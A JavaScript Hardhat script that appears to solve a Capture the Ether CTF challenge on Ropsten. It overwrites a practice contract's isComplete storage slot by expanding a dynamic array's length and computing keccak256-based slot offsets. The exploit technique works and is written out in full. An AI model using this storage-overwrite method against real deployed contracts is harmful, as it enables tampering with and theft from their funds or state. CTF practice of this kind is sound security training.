const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");

async function main() {
    //The contract abi
    const abi = [
        {"constant":false,"inputs":[{"name":"key","type":"uint256"},{"name":"value","type":"uint256"}],"name":"set","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},
        {"constant":true,"inputs":[{"name":"key","type":"uint256"}],"name":"get","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},
        {"constant":true,"inputs":[],"name":"isComplete","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"}
    ];
    
    //The contract address - Just copy it from the CTE challenge page
    const contractAddress = "0x65DD6BC3eA28F67A13a708907381120339C691ec";
    
    /* 
    * To solve the challenge, you need to use your ropsten account, as CTE is expecting that account address.
    * To that effect, you need to export your private key from metamask and place it in the hardhat.config.js - the template is already there.
    * Then, we can get your wallet as the signer. The console.log should print your ropsten account address.
    */
    const [signer] = await ethers.getSigners();
    console.log("SIGNER: ", signer.address)

    //Get the contract and connect using your account
    var cteContract = new ethers.Contract(contractAddress, abi, signer);
    
    //We subtract 2 because the contract itself adds 1. So, the key will end up being 2**256 - 1, as we want.
    let maxKey = BigNumber.from(2).pow(256).sub(2);
    console.log("MAX KEY: ", maxKey);
    
    //Expand the array bounds to occupy the isComplete slot
    let expandBoundsTx = await cteContract.set(maxKey, 0)
    let expandBoundsTxReceipt = await expandBoundsTx.wait();
    console.log("ARRAY BOUNDS EXPANDED: ", expandBoundsTxReceipt);
      
    //Now we need to figure out which key to use to change the isComplete value. We know that map[0] value is stored at keccak256(1). This needs to be padded.
    const mapFirstDataSlotKey = BigNumber.from(ethers.utils.keccak256("0x0000000000000000000000000000000000000000000000000000000000000001"));
    console.log("MAP FIRST DATA SLOT KEY: ", mapFirstDataSlotKey);

    /*
    * Determine the key that allows us to change the isComplete value to 1. Since we know that we expanded the array bounds to 2**256 - 1 and that map[0] is at
    * keccak256(1), we know that map[isComplete] is at 2**256 - keccak256(1)
    */
    const isCompleteKey = BigNumber.from(2).pow(256).sub(mapFirstDataSlotKey);
    console.log("THE KEY TO ACCESS THE isComplete VALUE IS: ", isCompleteKey);
     
    //Change the isComplete value to true
    let changeIsCompleteTx = await cteContract.set(isCompleteKey, 1);
    let changeIsCompleteTxReceipt = await changeIsCompleteTx.wait();
    console.log("VALUE HAS BEEN CHANGED: ", changeIsCompleteTxReceipt);

    let isCompleteCheckTx = await cteContract.get(isCompleteKey);
    console.log("IS COMPLETE TX? ", isCompleteCheckTx);
}

main()
.then(() => process.exit(0))
.catch((error) => {
    console.log(error);
    process.exit(1);
});

